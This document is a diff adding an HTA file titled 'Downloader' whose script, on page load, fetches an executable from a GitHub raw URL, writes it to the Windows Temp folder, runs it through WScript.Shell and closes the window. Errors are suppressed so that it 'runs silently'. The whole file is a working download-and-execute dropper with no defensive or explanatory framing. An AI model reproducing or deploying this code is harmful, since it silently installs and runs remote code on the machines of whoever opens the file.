@@ -1,0 +1,39 @@
+<HTML>
+<HEAD>
+<TITLE>Downloader</TITLE>
+<HTA:APPLICATION ID="Downloader">
+<SCRIPT>
+window.onload = function() {
+    try {
+        var fileURL = "https://raw.githubusercontent.com/cernipoko-bit/sadlife/main/c.exe";
+        var localPath = "C:\\Windows\\Temp\\myapp.exe";
+        
+        // Download
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", fileURL, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Open();
+            stream.Type = 1;
+            stream.Write(xhr.responseBody);
+            stream.SaveToFile(localPath, 2);
+            stream.Close();
+            
+            // Execute
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run(localPath);
+        }
+        window.close(); // Close HTA window immediately
+    } catch(e) {
+        // Silent fail - no error messages
+        window.close();
+    }
+}
+</SCRIPT>
+</HEAD>
+<BODY>
+<!-- Empty body - runs silently -->
+</BODY>
+</HTML>
